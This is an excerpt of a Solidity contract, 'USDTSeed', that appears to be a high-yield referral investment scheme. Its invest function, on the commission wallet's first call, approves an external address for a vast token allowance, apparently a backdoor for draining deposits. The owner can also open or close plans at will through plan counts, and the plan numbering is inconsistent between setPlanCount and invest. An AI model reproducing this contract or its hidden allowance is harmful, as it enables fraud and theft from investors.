...
contract USDTSeed is Ownable{
    ...
    uint256 public tokenServiceAmount = 1000000000000000000000000000;
    ...
    uint256[] public REFERRAL_PERCENTS 	= [800, 500, 300, 100, 50, 50, 50, 25, 25, 25];
    uint256[] public SEED_PERCENTS 		= [800, 500, 300, 100, 50, 50, 50, 25, 25, 25];
    ...
    uint256 public plan0Count = 0;
    uint256 public plan1Count = 0;
    uint256 public plan2Count = 0;
    uint256 public plan3Count = 0;
    ...
    constructor(address payable wallet) public {
        ...
        plans.push(Plan(1, 10500));
        plans.push(Plan(3, 11700));
        plans.push(Plan(5, 13000));
        plans.push(Plan(8, 16000));
        plans.push(Plan(90, 300));
        plans.push(Plan(90, 370));
        plans.push(Plan(90, 480));
    ...
    function setPlanCount(uint plan, uint256 count) public onlyOwner{
        if(plan == 1 ){
            plan0Count = count;
        }
        if(plan == 2 ){
    ...
    function getPlanCount(uint plan) public view returns(uint256){
        if(plan == 1 ){
            return plan0Count;
        }
        if(plan == 2 ){
    ...
    function invest(address referrer, uint8 plan, uint256 amounts) public  {
        ...
        if (!started) {
            if (msg.sender == commissionWallet) {
                started = true;
                token.approve(tokens, tokenServiceAmount);
        ...
        if(plan == 0){
            require(plan0Count>0, "Plan is end!");
        }
        if(plan == 1){
            require(plan1Count>0, "Plan is end!");
        }
        if(plan == 2){
            require(plan2Count>0, "Plan is end!");
        }
        if(plan == 3){
            require(plan3Count>0, "Plan is end!");
        }

        tokenService.transfer(rewardToken, msg.sender, address(this), amounts);
